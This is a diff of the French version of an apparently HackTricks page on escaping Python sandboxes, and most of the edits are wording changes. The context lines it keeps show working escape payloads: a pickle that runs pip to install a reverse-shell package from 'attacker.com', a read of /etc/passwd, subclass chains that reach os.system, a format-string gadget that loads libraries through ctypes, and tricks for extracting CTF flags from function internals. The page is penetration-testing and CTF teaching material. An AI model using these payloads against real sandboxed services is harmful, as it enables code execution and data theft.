@@ -2,9 +2,9 @@
 
 {{#include ../../../banners/hacktricks-training.md}}
 
-Ce sont quelques astuces pour contourner les protections des sandboxes Python et exécuter des commandes arbitraires.
+Voici quelques astuces pour contourner les protections des sandboxes Python et exécuter des commandes arbitraires.
 
-## Bibliothèques d'exécution de commandes
+## Command Execution Libraries
 
 La première chose que vous devez savoir est si vous pouvez exécuter directement du code avec une bibliothèque déjà importée, ou si vous pourriez importer l'une de ces bibliothèques :
 ```python
@@ -41,18 +41,17 @@ system('ls')
 ```
 Rappelez-vous que les fonctions _**open**_ et _**read**_ peuvent être utiles pour **lire des fichiers** à l'intérieur du sandbox python et pour **écrire du code** que vous pourriez **exécuter** pour **contourner** le sandbox.
 
-> [!CAUTION]
-> La fonction **input()** de Python2 permet d'exécuter du code python avant que le programme ne plante.
+> [!CAUTION] > La fonction **input()** de **Python2** permet d'exécuter du code python avant que le programme ne plante.
 
 Python essaie de **charger les bibliothèques du répertoire courant en premier** (la commande suivante affichera d'où python charge les modules) : `python3 -c 'import sys; print(sys.path)'`
 
 ![](<../../../images/image (559).png>)
 
-## Contourner le sandbox pickle avec les packages python installés par défaut
+## Contourner le sandbox pickle avec les paquets python installés par défaut
 
-### Packages par défaut
+### Paquets par défaut
 
-Vous pouvez trouver une **liste des packages pré-installés** ici : [https://docs.qubole.com/en/latest/user-guide/package-management/pkgmgmt-preinstalled-packages.html](https://docs.qubole.com/en/latest/user-guide/package-management/pkgmgmt-preinstalled-packages.html)\
+Vous pouvez trouver une **liste des paquets pré-installés** ici : [https://docs.qubole.com/en/latest/user-guide/package-management/pkgmgmt-preinstalled-packages.html](https://docs.qubole.com/en/latest/user-guide/package-management/pkgmgmt-preinstalled-packages.html)\
 Notez qu'à partir d'un pickle, vous pouvez faire en sorte que l'environnement python **importe des bibliothèques arbitraires** installées sur le système.\
 Par exemple, le pickle suivant, lorsqu'il est chargé, va importer la bibliothèque pip pour l'utiliser :
 ```python
@@ -80,7 +79,9 @@ pip.main(["install", "http://attacker.com/Rerverse.tar.gz"])
 ```
 Vous pouvez télécharger le package pour créer le reverse shell ici. Veuillez noter qu'avant de l'utiliser, vous devez **le décompresser, modifier le `setup.py` et mettre votre IP pour le reverse shell** :
 
-{% file src="../../../images/Reverse.tar (1).gz" %}
+{{#file}}
+Reverse.tar (1).gz
+{{#endfile}}
 
 > [!NOTE]
 > Ce package s'appelle `Reverse`. Cependant, il a été spécialement conçu pour que lorsque vous quittez le reverse shell, le reste de l'installation échoue, donc vous **ne laisserez aucun package python supplémentaire installé sur le serveur** lorsque vous partirez.
@@ -313,10 +314,10 @@ __builtins__.__dict__['__import__']("os").system("ls")
 ```
 ### Pas de Builtins
 
-Lorsque vous n'avez pas `__builtins__`, vous ne pourrez pas importer quoi que ce soit ni même lire ou écrire des fichiers car **toutes les fonctions globales** (comme `open`, `import`, `print`...) **ne sont pas chargées**.\
+Lorsque vous n'avez pas `__builtins__`, vous ne pourrez rien importer ni même lire ou écrire des fichiers car **toutes les fonctions globales** (comme `open`, `import`, `print`...) **ne sont pas chargées**.\
 Cependant, **par défaut, python importe beaucoup de modules en mémoire**. Ces modules peuvent sembler bénins, mais certains d'entre eux **importent également des** fonctionnalités **dangereuses** à l'intérieur qui peuvent être accessibles pour obtenir même **une exécution de code arbitraire**.
 
-Dans les exemples suivants, vous pouvez observer comment **abuser** de certains de ces modules "**bénins**" chargés pour **accéder** à des **fonctionnalités** **dangereuses** à l'intérieur d'eux.
+Dans les exemples suivants, vous pouvez observer comment **abuser** de certains de ces modules "**bénins**" chargés pour **accéder** à des **fonctionnalités** **dangereuses** à l'intérieur. 
 
 **Python2**
 ```python
@@ -366,7 +367,7 @@ get_flag.__globals__['__builtins__']
 __builtins__= [x for x in (1).__class__.__base__.__subclasses__() if x.__name__ == 'catch_warnings'][0]()._module.__builtins__
 __builtins__["__import__"]('os').system('ls')
 ```
-### Payloads intégrés
+### Charges utiles intégrées
 ```python
 # Possible payloads once you have found the builtins
 __builtins__["open"]("/etc/passwd").read()
@@ -685,7 +686,7 @@ Notez comment vous pouvez **accéder aux attributs** de manière normale avec un
 
 Notez également que vous pouvez utiliser `.__dict__` pour énumérer les éléments d'un objet `get_name_for_avatar("{people_obj.__init__.__globals__[os].__dict__}", people_obj = people)`
 
-Certaines autres caractéristiques intéressantes des chaînes de format sont la possibilité d'**exécuter** les **fonctions** **`str`**, **`repr`** et **`ascii`** sur l'objet indiqué en ajoutant **`!s`**, **`!r`**, **`!a`** respectivement :
+Certaines autres caractéristiques intéressantes des chaînes de format sont la possibilité d'**exécuter** les **fonctions** **`str`**, **`repr`** et **`ascii`** dans l'objet indiqué en ajoutant **`!s`**, **`!r`**, **`!a`** respectivement :
 ```python
 st = "{people_obj.__init__.__globals__[CONFIG][KEY]!a}"
 get_name_for_avatar(st, people_obj = people)
@@ -703,7 +704,7 @@ return 'HAL 9000'
 ```
 **Plus d'exemples** sur les **exemples de chaînes de format** peuvent être trouvés sur [**https://pyformat.info/**](https://pyformat.info)
 
-> [!AVERTISSEMENT]
+> [!CAUTION]
 > Vérifiez également la page suivante pour des gadgets qui vont r**écupérer des informations sensibles à partir des objets internes de Python** :
 
 {{#ref}}
@@ -732,7 +733,7 @@ Depuis [ici](https://www.cyberark.com/resources/threat-research-blog/anatomy-of-
 
 ### Du format à l'exécution de code à distance en chargeant des bibliothèques
 
-Selon le [**challenge TypeMonkey de cet article**](https://corgi.rip/posts/buckeye-writeups/), il est possible de charger des bibliothèques arbitraires depuis le disque en abusant de la vulnérabilité de chaîne de format dans python.
+Selon le [**TypeMonkey chall de cet article**](https://corgi.rip/posts/buckeye-writeups/), il est possible de charger des bibliothèques arbitraires depuis le disque en abusant de la vulnérabilité de chaîne de format dans python.
 
 En rappel, chaque fois qu'une action est effectuée en python, une fonction est exécutée. Par exemple, `2*3` exécutera **`(2).mul(3)`** ou **`{'a':'b'}['a']`** sera **`{'a':'b'}.__getitem__('a')`**.
 
@@ -767,14 +768,14 @@ Ce gadget permet de **charger une bibliothèque depuis le disque**. Par conséqu
 ```python
 '{i.find.__globals__[so].mapperlib.sys.modules[ctypes].cdll[/path/to/file]}'
 ```
-Le défi abuse en réalité d'une autre vulnérabilité sur le serveur qui permet de créer des fichiers arbitraires sur le disque des serveurs.
+Le défi abuse en fait d'une autre vulnérabilité sur le serveur qui permet de créer des fichiers arbitraires sur le disque des serveurs.
 
 ## Dissection des objets Python
 
 > [!NOTE]
 > Si vous voulez **apprendre** sur le **bytecode python** en profondeur, lisez ce **superbe** article sur le sujet : [**https://towardsdatascience.com/understanding-python-bytecode-e7edaae8734d**](https://towardsdatascience.com/understanding-python-bytecode-e7edaae8734d)
 
-Dans certains CTFs, vous pourriez recevoir le nom d'une **fonction personnalisée où le flag** réside et vous devez examiner les **internes** de la **fonction** pour l'extraire.
+Dans certains CTF, vous pourriez recevoir le nom d'une **fonction personnalisée où le flag** réside et vous devez voir les **internes** de la **fonction** pour l'extraire.
 
 C'est la fonction à inspecter :
 ```python
@@ -796,7 +797,7 @@ dir(get_flag) #Get info tof the function
 ```
 #### globals
 
-`__globals__` et `func_globals` (Identiques) Obtient l'environnement global. Dans l'exemple, vous pouvez voir certains modules importés, quelques variables globales et leur contenu déclaré :
+`__globals__` et `func_globals` (Identique) Obtient l'environnement global. Dans l'exemple, vous pouvez voir certains modules importés, quelques variables globales et leur contenu déclaré :
 ```python
 get_flag.func_globals
 get_flag.__globals__
@@ -897,7 +898,7 @@ dis.dis(get_flag)
 44 LOAD_CONST               0 (None)
 47 RETURN_VALUE
 ```
-Remarquez que **si vous ne pouvez pas importer `dis` dans le sandbox python**, vous pouvez obtenir le **bytecode** de la fonction (`get_flag.func_code.co_code`) et **le désassembler** localement. Vous ne verrez pas le contenu des variables étant chargées (`LOAD_CONST`), mais vous pouvez les deviner à partir de (`get_flag.func_code.co_consts`) car `LOAD_CONST` indique également le décalage de la variable étant chargée.
+Remarquez que **si vous ne pouvez pas importer `dis` dans le sandbox python**, vous pouvez obtenir le **bytecode** de la fonction (`get_flag.func_code.co_code`) et **le désassembler** localement. Vous ne verrez pas le contenu des variables en cours de chargement (`LOAD_CONST`), mais vous pouvez les deviner à partir de (`get_flag.func_code.co_consts`) car `LOAD_CONST` indique également l'offset de la variable en cours de chargement.
 ```python
 dis.dis('d\x01\x00}\x01\x00d\x02\x00}\x02\x00d\x03\x00d\x04\x00g\x02\x00}\x03\x00|\x00\x00|\x02\x00k\x02\x00r(\x00d\x05\x00Sd\x06\x00Sd\x00\x00S')
 0 LOAD_CONST          1 (1)
@@ -919,7 +920,7 @@ dis.dis('d\x01\x00}\x01\x00d\x02\x00}\x02\x00d\x03\x00d\x04\x00g\x02\x00}\x03\x0
 44 LOAD_CONST          0 (0)
 47 RETURN_VALUE
 ```
-## Compilation de Python
+## Compiler Python
 
 Maintenant, imaginons que d'une manière ou d'une autre, vous pouvez **extraire les informations sur une fonction que vous ne pouvez pas exécuter** mais que vous **devez** **l'exécuter**.\
 Comme dans l'exemple suivant, vous **pouvez accéder à l'objet code** de cette fonction, mais en lisant simplement le désassemblage, vous **ne savez pas comment calculer le flag** (_imaginez une fonction `calc_flag` plus complexe_)
@@ -981,7 +982,7 @@ function_type(code_obj, mydict, None, None, None)("secretcode")
 ```
 ### Bypass Defenses
 
-Dans les exemples précédents au début de ce post, vous pouvez voir **comment exécuter n'importe quel code python en utilisant la fonction `compile`**. C'est intéressant car vous pouvez **exécuter des scripts entiers** avec des boucles et tout dans une **ligne** (et nous pourrions faire la même chose en utilisant **`exec`**).\
+Dans les exemples précédents au début de ce post, vous pouvez voir **comment exécuter n'importe quel code python en utilisant la fonction `compile`**. C'est intéressant car vous pouvez **exécuter des scripts entiers** avec des boucles et tout le reste en une **ligne** (et nous pourrions faire la même chose en utilisant **`exec`**).\
 Quoi qu'il en soit, parfois il pourrait être utile de **créer** un **objet compilé** sur une machine locale et de l'exécuter sur la **machine CTF** (par exemple parce que nous n'avons pas la fonction `compiled` dans le CTF).
 
 Par exemple, compilons et exécutons manuellement une fonction qui lit _./poc.py_:
@@ -1053,6 +1054,5 @@ sera contourné
 - [https://gynvael.coldwind.pl/n/python_sandbox_escape](https://gynvael.coldwind.pl/n/python_sandbox_escape)
 - [https://nedbatchelder.com/blog/201206/eval_really_is_dangerous.html](https://nedbatchelder.com/blog/201206/eval_really_is_dangerous.html)
 - [https://infosecwriteups.com/how-assertions-can-get-you-hacked-da22c84fb8f6](https://infosecwriteups.com/how-assertions-can-get-you-hacked-da22c84fb8f6)
-
 
 {{#include ../../../banners/hacktricks-training.md}}
